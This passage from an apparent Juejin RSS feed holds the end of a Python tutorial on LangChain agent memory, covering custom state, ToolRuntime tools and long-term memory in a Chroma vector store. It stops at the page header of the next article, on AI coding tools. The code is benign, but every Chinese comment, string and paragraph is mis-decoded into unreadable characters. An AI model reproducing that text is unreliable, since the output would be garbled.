    config = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"custom_state_user"</span>}}

    <span class="hljs-comment"># ç¬¬ä¸€è½®ï¼šåˆå§‹åŒ–ç”¨æˆ·ä¿¡æ¯</span>
    result1 = agent.invoke(
        {
            <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"è®¾ç½®ä¸»é¢˜ä¸ºæš—é»‘æ¨¡å¼"</span>}],
            <span class="hljs-string">"user_id"</span>: <span class="hljs-string">"user_789"</span>,  <span class="hljs-comment"># è‡ªå®šä¹‰å­—æ®µ</span>
            <span class="hljs-string">"preferences"</span>: {<span class="hljs-string">"language"</span>: <span class="hljs-string">"zh-CN"</span>},  <span class="hljs-comment"># åˆå§‹åå¥½</span>
            <span class="hljs-string">"visit_count"</span>: <span class="hljs-number">1</span>
        },
        config=config
    )
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç¬¬ä¸€è½®: <span class="hljs-subst">{result1[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>].content}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">40</span>)

    <span class="hljs-comment"># ç¬¬äºŒè½®ï¼šè¯»å–è®°å¿†</span>
    result2 = agent.invoke(
        {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"æ‰“ä¸ªæ‹›å‘¼"</span>}]},
        config=config
    )
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç¬¬äºŒè½®: <span class="hljs-subst">{result2[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>].content}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">40</span>)

    <span class="hljs-comment"># æŸ¥çœ‹å®Œæ•´çŠ¶æ€</span>
    state = agent.get_state(config)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å½“å‰è®°å¿†çŠ¶æ€:"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  ç”¨æˆ·ID: <span class="hljs-subst">{state.values.get(<span class="hljs-string">'user_id'</span>)}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  åå¥½: <span class="hljs-subst">{state.values.get(<span class="hljs-string">'preferences'</span>)}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  æ¶ˆæ¯æ•°: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(state.values[<span class="hljs-string">'messages'</span>])}</span>"</span>)

<span class="hljs-comment"># ============ è¿è¡Œè‡ªå®šä¹‰çŠ¶æ€ç¤ºä¾‹ ============</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    demo_custom_state()
</code></pre>
<h3 data-id="heading-6">æ ¸å¿ƒæ‹“å±•-è®¿é—®è®°å¿†</h3>
<h4 data-id="heading-7">åœ¨å·¥å…·ä¸­è¯»å–çŸ­æœŸè®°å¿†</h4>
<blockquote>
<p>ä½¿ç”¨Â <code>ToolRuntime</code>Â å‚æ•°åœ¨å·¥å…·ä¸­è®¿é—®çŸ­æœŸè®°å¿†ï¼ˆçŠ¶æ€ï¼‰ã€‚<code>tool_runtime</code>Â å‚æ•°åœ¨å·¥å…·ç­¾åä¸­æ˜¯éšè—çš„ï¼ˆå› æ­¤æ¨¡å‹çœ‹ä¸åˆ°ï¼‰ï¼Œä½†å·¥å…·å¯ä»¥é€šè¿‡å®ƒè®¿é—®çŠ¶æ€ã€‚</p>
</blockquote>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_agent, AgentState
<span class="hljs-keyword">from</span> langchain.tools <span class="hljs-keyword">import</span> tool, ToolRuntime


<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomState</span>(<span class="hljs-title class_ inherited__">AgentState</span>):
    user_id: <span class="hljs-built_in">str</span>

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_info</span>(<span class="hljs-params">
    runtime: ToolRuntime
</span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""Look up user info."""</span>
    user_id = runtime.state[<span class="hljs-string">"user_id"</span>]
    <span class="hljs-keyword">return</span> <span class="hljs-string">"User is John Smith"</span> <span class="hljs-keyword">if</span> user_id == <span class="hljs-string">"user_123"</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"Unknown user"</span>

agent = create_agent(
    model=<span class="hljs-string">"gpt-5-nano"</span>,
    tools=[get_user_info],
    state_schema=CustomState,
)

result = agent.invoke({
    <span class="hljs-string">"messages"</span>: <span class="hljs-string">"look up user information"</span>,
    <span class="hljs-string">"user_id"</span>: <span class="hljs-string">"user_123"</span>
})
<span class="hljs-built_in">print</span>(result[<span class="hljs-string">"messages"</span>][-<span class="hljs-number">1</span>].content)
<span class="hljs-comment"># &gt; User is John Smith.</span>
</code></pre>
<h4 data-id="heading-8">é€šè¿‡å·¥å…·å†™å…¥çŸ­æœŸè®°å¿†</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.tools <span class="hljs-keyword">import</span> tool, ToolRuntime
<span class="hljs-keyword">from</span> langchain_core.runnables <span class="hljs-keyword">import</span> RunnableConfig
<span class="hljs-keyword">from</span> langchain.messages <span class="hljs-keyword">import</span> ToolMessage
<span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_agent, AgentState
<span class="hljs-keyword">from</span> langgraph.types <span class="hljs-keyword">import</span> Command
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel


<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomState</span>(<span class="hljs-title class_ inherited__">AgentState</span>):  
    user_name: <span class="hljs-built_in">str</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomContext</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    user_id: <span class="hljs-built_in">str</span>

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user_info</span>(<span class="hljs-params">
    runtime: ToolRuntime[CustomContext, CustomState],
</span>) -&gt; Command:
    <span class="hljs-string">"""Look up and update user info."""</span>
    user_id = runtime.context.user_id
    name = <span class="hljs-string">"John Smith"</span> <span class="hljs-keyword">if</span> user_id == <span class="hljs-string">"user_123"</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"Unknown user"</span>
    <span class="hljs-keyword">return</span> Command(update={  
        <span class="hljs-string">"user_name"</span>: name,
        <span class="hljs-comment"># update the message history</span>
        <span class="hljs-string">"messages"</span>: [
            ToolMessage(
                <span class="hljs-string">"Successfully looked up user information"</span>,
                tool_call_id=runtime.tool_call_id
            )
        ]
    })

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">
    runtime: ToolRuntime[CustomContext, CustomState]
</span>) -&gt; <span class="hljs-built_in">str</span> | Command:
    <span class="hljs-string">"""Use this to greet the user once you found their info."""</span>
    user_name = runtime.state.get(<span class="hljs-string">"user_name"</span>, <span class="hljs-literal">None</span>)
    <span class="hljs-keyword">if</span> user_name <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
       <span class="hljs-keyword">return</span> Command(update={
            <span class="hljs-string">"messages"</span>: [
                ToolMessage(
                    <span class="hljs-string">"Please call the 'update_user_info' tool it will get and update the user's name."</span>,
                    tool_call_id=runtime.tool_call_id
                )
            ]
        })
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"Hello <span class="hljs-subst">{user_name}</span>!"</span>

agent = create_agent(
    model=<span class="hljs-string">"gpt-5-nano"</span>,
    tools=[update_user_info, greet],
    state_schema=CustomState, 
    context_schema=CustomContext,
)

agent.invoke(
    {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"greet the user"</span>}]},
    context=CustomContext(user_id=<span class="hljs-string">"user_123"</span>),
)
</code></pre>
<h3 data-id="heading-9">é•¿æœŸè®°å¿†</h3>
<blockquote>
<p>é•¿æœŸè®°å¿†é€šè¿‡ä¸å¤–éƒ¨å‘é‡æ•°æ®åº“æˆ–é”®å€¼å­˜å‚¨é›†æˆæ¥å®ç°ã€‚å¯ä»¥åœ¨Agentæ‰§è¡Œçš„å…³é”®èŠ‚ç‚¹ï¼ˆå¦‚å¯¹è¯ç»“æŸæ—¶ï¼‰æå–å…³é”®ä¿¡æ¯ã€ç”¨æˆ·åå¥½ç­‰ï¼Œå¹¶å­˜å…¥é•¿æœŸè®°å¿†åº“ï¼Œä¾›æœªæ¥çš„å¯¹è¯ä½¿ç”¨ã€‚</p>
</blockquote>
<p><strong>è¯­ä¹‰æ£€ç´¢ä¸å‘é‡æ•°æ®åº“</strong></p>
<ul>
<li>å‘é‡æ•°æ®åº“æ˜¯å®ç°é•¿æœŸè®°å¿†çš„æ ¸å¿ƒæŠ€æœ¯ï¼Œé€šè¿‡è¯­ä¹‰ç›¸ä¼¼åº¦æœç´¢å®ç°çŸ¥è¯†çš„é•¿æœŸå­˜å‚¨å’Œæ£€ç´¢ã€‚</li>
</ul>
<p><strong>æŠ€æœ¯å®ç°ï¼š</strong></p>
<ul>
<li><strong>å‘é‡åŒ–å­˜å‚¨</strong>ï¼šå°†å¯¹è¯å†…å®¹ã€ç”¨æˆ·åå¥½ç­‰è½¬æ¢ä¸ºå‘é‡è¡¨ç¤º</li>
<li><strong>è¯­ä¹‰æ£€ç´¢</strong>ï¼šåŸºäºå‘é‡ç›¸ä¼¼åº¦å®ç°æ™ºèƒ½æœç´¢</li>
<li><strong>å¤šæ¨¡æ€æ”¯æŒ</strong>ï¼šæ”¯æŒæ–‡æœ¬ã€å›¾åƒã€éŸ³é¢‘ç­‰å¤šç§æ•°æ®ç±»å‹</li>
<li><strong>é«˜æ€§èƒ½æŸ¥è¯¢</strong>ï¼šæ”¯æŒå¤§è§„æ¨¡æ•°æ®çš„å¿«é€Ÿæ£€ç´¢</li>
</ul>
<p><strong>å…¸å‹å®ç°ï¼š</strong></p>
<ul>
<li>Milvusï¼šå¼€æºå‘é‡æ•°æ®åº“ï¼Œæ”¯æŒå¤§è§„æ¨¡å‘é‡æ£€ç´¢</li>
<li>Qdrantï¼šé«˜æ€§èƒ½å‘é‡æœç´¢å¼•æ“</li>
<li>Pineconeï¼šäº‘åŸç”Ÿå‘é‡æ•°æ®åº“æœåŠ¡</li>
<li>Chroma: è½»é‡çº§å‘é‡æ•°æ®åº“ï¼Œå¯æœ¬åœ°æŒä¹…åŒ–</li>
</ul>
<blockquote>
<p>pip install langchain-chroma</p>
</blockquote>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> uuid
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>

<span class="hljs-comment"># --- 1. å¯¼å…¥ç»„ä»¶ ---</span>
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI, OpenAIEmbeddings
<span class="hljs-keyword">from</span> langchain_core.tools <span class="hljs-keyword">import</span> tool
<span class="hljs-keyword">from</span> langchain_core.messages <span class="hljs-keyword">import</span> HumanMessage, SystemMessage
<span class="hljs-keyword">from</span> langchain_chroma <span class="hljs-keyword">import</span> Chroma <span class="hljs-comment"># å‘é‡æ•°æ®åº“</span>
<span class="hljs-keyword">from</span> langchain_core.documents <span class="hljs-keyword">import</span> Document
<span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> AgentState, create_agent
<span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> MemorySaver

<span class="hljs-comment"># ç¡®ä¿é…ç½®äº† OPENAI_API_KEY</span>
<span class="hljs-comment"># os.environ["OPENAI_API_KEY"] = "sk-..."</span>

<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 2. åˆå§‹åŒ–å‘é‡æ•°æ®åº“ (é•¿æœŸè®°å¿†çš„ç‰©ç†è½½ä½“)</span>
<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œè¿™é‡Œåº”è¯¥æ˜¯è¿æ¥åˆ° Pinecone, Milvus æˆ–æœ¬åœ°æŒä¹…åŒ–çš„ Chroma</span>
embeddings = OpenAIEmbeddings(model=<span class="hljs-string">"text-embedding-3-small"</span>)
vector_store = Chroma(
    collection_name=<span class="hljs-string">"agent_long_term_memory"</span>,
    embedding_function=embeddings,
    <span class="hljs-comment">#persist_directory="./chroma_db" # å¦‚æœæƒ³å­˜åˆ°ç¡¬ç›˜ï¼Œå–æ¶ˆæ³¨é‡Šè¿™ä¸€è¡Œ</span>
)

<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 3. å®šä¹‰è®°å¿†å·¥å…· (Agent çš„æ‰‹)</span>
<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 3.1 å®šä¹‰è®°å¿†ä¿å­˜å·¥å…·</span>
<span class="hljs-comment"># ==========================================</span>
<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">save_memory</span>(<span class="hljs-params">content: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-string">"""
    å°†é‡è¦ä¿¡æ¯ä¿å­˜åˆ°é•¿æœŸè®°å¿†ä¸­ã€‚
    å½“ä½ è·çŸ¥ç”¨æˆ·çš„å–œå¥½ã€èŒä¸šã€è®¡åˆ’æˆ–å…¶ä»–é•¿æœŸæœ‰æ•ˆçš„äº‹å®æ—¶ï¼Œè°ƒç”¨æ­¤å·¥å…·ã€‚
    å‚æ•°:
        content (str): è¦ä¿å­˜çš„è®°å¿†å†…å®¹ã€‚
    """</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n[è®°å¿†æ“ä½œ] æ­£åœ¨ä¿å­˜è®°å¿†: '<span class="hljs-subst">{content}</span>'"</span>)
    <span class="hljs-comment"># å°†æ–‡æœ¬å°è£…ä¸º Document</span>
    doc = Document(
        page_content=content,
        metadata={<span class="hljs-string">"source"</span>: <span class="hljs-string">"user_interaction"</span>, <span class="hljs-string">"timestamp"</span>: <span class="hljs-string">"simulated_time"</span>}
    )
    <span class="hljs-comment"># å†™å…¥å‘é‡åº“</span>
    vector_store.add_documents([doc])
    <span class="hljs-keyword">return</span> <span class="hljs-string">"è®°å¿†å·²æˆåŠŸä¿å­˜ã€‚"</span>

<span class="hljs-comment"># 3.2 å®šä¹‰è®°å¿†æœç´¢å·¥å…·</span>
<span class="hljs-comment"># ==========================================</span>
<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">search_memory</span>(<span class="hljs-params">query: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-string">"""
    ä»é•¿æœŸè®°å¿†ä¸­æœç´¢ç›¸å…³ä¿¡æ¯ã€‚
    å½“ä½ è¢«é—®åŠå…³äºç”¨æˆ·è¿‡å»çš„é—®é¢˜ï¼Œæˆ–è€…ä½ ä¸ç¡®å®šç­”æ¡ˆæ—¶ï¼Œä½¿ç”¨æ­¤å·¥å…·è¿›è¡ŒæŸ¥æ‰¾ã€‚
    å‚æ•°:
        query (str): è¦æœç´¢çš„æŸ¥è¯¢è¯­å¥ã€‚
    """</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n[è®°å¿†æ“ä½œ] æ­£åœ¨æœç´¢è®°å¿†: '<span class="hljs-subst">{query}</span>'"</span>)

    <span class="hljs-comment"># æ‰§è¡Œè¯­ä¹‰æœç´¢ (k=2 è¡¨ç¤ºåªå–æœ€ç›¸å…³çš„2æ¡)</span>
    results = vector_store.similarity_search(query, k=<span class="hljs-number">2</span>)

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> results:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"æ²¡æœ‰æ‰¾åˆ°ç›¸å…³çš„è®°å¿†ã€‚"</span>

    <span class="hljs-comment"># å°†æœç´¢ç»“æœæ‹¼æ¥æˆå­—ç¬¦ä¸²è¿”å›ç»™ Agent</span>
    memory_content = <span class="hljs-string">"\n"</span>.join([<span class="hljs-string">f"- <span class="hljs-subst">{doc.page_content}</span>"</span> <span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> results])
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"æ‰¾åˆ°ä»¥ä¸‹ç›¸å…³è®°å¿†:\n<span class="hljs-subst">{memory_content}</span>"</span>

<span class="hljs-comment"># å°†å·¥å…·æ”¾å…¥åˆ—è¡¨</span>
tools = [save_memory, search_memory]

<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 4. åˆ›å»º Agent</span>
<span class="hljs-comment"># ==========================================</span>

<span class="hljs-comment"># å®šä¹‰ç³»ç»Ÿæç¤ºè¯ï¼šæ•™ä¼š Agent ä½•æ—¶ä½¿ç”¨è®°å¿†å·¥å…·</span>
SYSTEM_PROMPT = <span class="hljs-string">"""ä½ æ˜¯ä¸€ä¸ªæ‹¥æœ‰é•¿æœŸè®°å¿†çš„ç§äººåŠ©æ‰‹ã€‚
ä½ çš„ç›®æ ‡æ˜¯è®°ä½ç”¨æˆ·çš„å–œå¥½å’Œé‡è¦ä¿¡æ¯ï¼Œä»¥ä¾¿æä¾›ä¸ªæ€§åŒ–æœåŠ¡ã€‚

1. å¦‚æœç”¨æˆ·å‘Šè¯‰ä½ ä»»ä½•å…³äºä»–ä»¬è‡ªå·±çš„äº‹å®ï¼ˆå¦‚åå­—ã€å–œå¥½ã€å±…ä½åœ°ï¼‰ï¼Œè¯·åŠ¡å¿…è°ƒç”¨ 'save_memory' å·¥å…·ä¿å­˜ã€‚
2. å¦‚æœç”¨æˆ·é—®ä½ ä¸€ä¸ªé—®é¢˜ï¼Œè€Œç­”æ¡ˆå¯èƒ½åœ¨ä½ ä¹‹å‰çš„è®°å¿†ä¸­ï¼Œè¯·å…ˆè°ƒç”¨ 'search_memory' å·¥å…·æŸ¥æ‰¾ã€‚
3. å¦‚æœåªæ˜¯é—²èŠï¼Œä¸éœ€è¦è°ƒç”¨å·¥å…·ã€‚
"""</span>

llm = ChatOpenAI(model=<span class="hljs-string">"gpt-4o"</span>, temperature=<span class="hljs-number">0</span>) <span class="hljs-comment"># å»ºè®®ä½¿ç”¨ GPT-4 æˆ–æ›´å¼ºçš„æ¨¡å‹ä»¥ä¿è¯å·¥å…·è°ƒç”¨å‡†ç¡®ç‡</span>

<span class="hljs-comment"># ä½¿ç”¨ checkpointer ä¾ç„¶æ˜¯å¿…è¦çš„ï¼Œç”¨äºç»´æŒå½“å‰è¿™ä¸€è½®å¯¹è¯çš„ä¸Šä¸‹æ–‡</span>
checkpointer = MemorySaver()

<span class="hljs-comment"># åˆ›å»º Agent åº”ç”¨</span>
agent_app = create_agent(
    llm,
    tools,
    system_prompt=SYSTEM_PROMPT, <span class="hljs-comment"># æ³¨å…¥ç³»ç»Ÿæç¤ºè¯</span>
    checkpointer=checkpointer
)

<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 5. è¿è¡Œæ¼”ç¤º</span>
<span class="hljs-comment"># ==========================================</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">run_demo</span>():
    <span class="hljs-comment"># === åœºæ™¯ Aï¼šå­˜å…¥è®°å¿† ===</span>
    <span class="hljs-comment"># ä½¿ç”¨ä¸€ä¸ª thread_idï¼Œä»£è¡¨è¿™æ˜¯ä»Šå¤©çš„å¯¹è¯</span>
    config_a = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"session_today"</span>}}

    <span class="hljs-built_in">print</span>(<span class="hljs-string">"--- åœºæ™¯ Aï¼šç”¨æˆ·å‘Šè¯‰ Agent å–œå¥½ ---"</span>)
    user_input_1 = <span class="hljs-string">"ä½ å¥½ï¼Œè®°ä½æˆ‘æœ€å–œæ¬¢çš„æ°´æœæ˜¯è‰è“ï¼Œè€Œä¸”æˆ‘å¯¹èŠ±ç”Ÿè¿‡æ•ã€‚"</span>

    <span class="hljs-comment"># è¿è¡Œ Agentï¼Œstream_mode="values"å‚æ•°ï¼Œè¿”å›æ¯ä¸ªæ—¶é—´æ­¥çš„ä¸­é—´ç»“æœ</span>
    <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> agent_app.stream({<span class="hljs-string">"messages"</span>: [HumanMessage(content=user_input_1)]}, config=config_a, stream_mode=<span class="hljs-string">"values"</span>):
        <span class="hljs-comment"># åªæ‰“å°æœ€åä¸€æ¡æœºå™¨äººçš„å›å¤</span>
        <span class="hljs-keyword">pass</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Agent: <span class="hljs-subst">{chunk[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>].content}</span>"</span>)

    <span class="hljs-comment"># === åœºæ™¯ Bï¼šæ¨¡æ‹Ÿé—å¿˜ (å¼€å¯æ–°çº¿ç¨‹) ===</span>
    <span class="hljs-comment"># æˆ‘ä»¬æ¢ä¸€ä¸ª thread_idï¼Œè¿™æ„å‘³ç€ Agent å¤±å»äº†â€œçŸ­æœŸè®°å¿†â€ (MemorySaver é‡Œçš„ä¸œè¥¿è®¿é—®ä¸åˆ°äº†)</span>
    <span class="hljs-comment"># ä½†æ˜¯ï¼Œé•¿æœŸè®°å¿†åœ¨ VectorStore é‡Œï¼Œæ˜¯å¯ä»¥è·¨ thread è®¿é—®çš„ï¼</span>
    config_b = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"session_tomorrow"</span>}}

    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n--- åœºæ™¯ Bï¼šç¬¬äºŒå¤© (æ–°çš„ Sessionï¼ŒçŸ­æœŸè®°å¿†å·²æ¸…ç©º) ---"</span>)
    user_input_2 = <span class="hljs-string">"æˆ‘æƒ³åƒç‚¹é›¶é£Ÿï¼Œä½†æˆ‘å¿˜äº†æˆ‘æœ‰ä»€ä¹ˆå¿Œå£ï¼Œä½ èƒ½å¸®æˆ‘æŸ¥æŸ¥å—ï¼Ÿ"</span>

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"User: <span class="hljs-subst">{user_input_2}</span>"</span>)

    <span class="hljs-comment"># è§‚å¯Ÿæ§åˆ¶å°è¾“å‡ºï¼Œä½ ä¼šçœ‹åˆ° Agent è‡ªåŠ¨è°ƒç”¨ search_memory</span>
    final_response = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> agent_app.stream({<span class="hljs-string">"messages"</span>: [HumanMessage(content=user_input_2)]}, config=config_b, stream_mode=<span class="hljs-string">"values"</span>):
        final_response = chunk[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>]

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Agent: <span class="hljs-subst">{final_response.content}</span>"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    run_demo()

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€æºAIç¼–ç¨‹å·¥å…·æŠ€æœ¯å¹²è´§ï¼šä»åˆ†å±‚æ¶æ„åˆ°åˆè§„å¼€å‘å…¨æµç¨‹æŒ‡å—]]></title>    <link>https://juejin.cn/post/7600990891206705179</link>    <guid>https://juejin.cn/post/7600990891206705179</guid>    <pubDate>2026-01-30T09:31:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600990891206705179" data-draft-id="7600787795477397550" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€æºAIç¼–ç¨‹å·¥å…·æŠ€æœ¯å¹²è´§ï¼šä»åˆ†å±‚æ¶æ„åˆ°åˆè§„å¼€å‘å…¨æµç¨‹æŒ‡å—"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-30T09:31:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="yyfyyf1234"/> <meta itemprop="url" content="https://juejin.cn/user/1875092429087980"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€æºAIç¼–ç¨‹å·¥å…·æŠ€æœ¯å¹²è´§ï¼šä»åˆ†å±‚æ¶æ„åˆ°åˆè§„å¼€å‘å…¨æµç¨‹æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1875092429087980/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    yyfyyf1234
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:31:00.000Z" title="Fri Jan 30 2026 09:31:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body 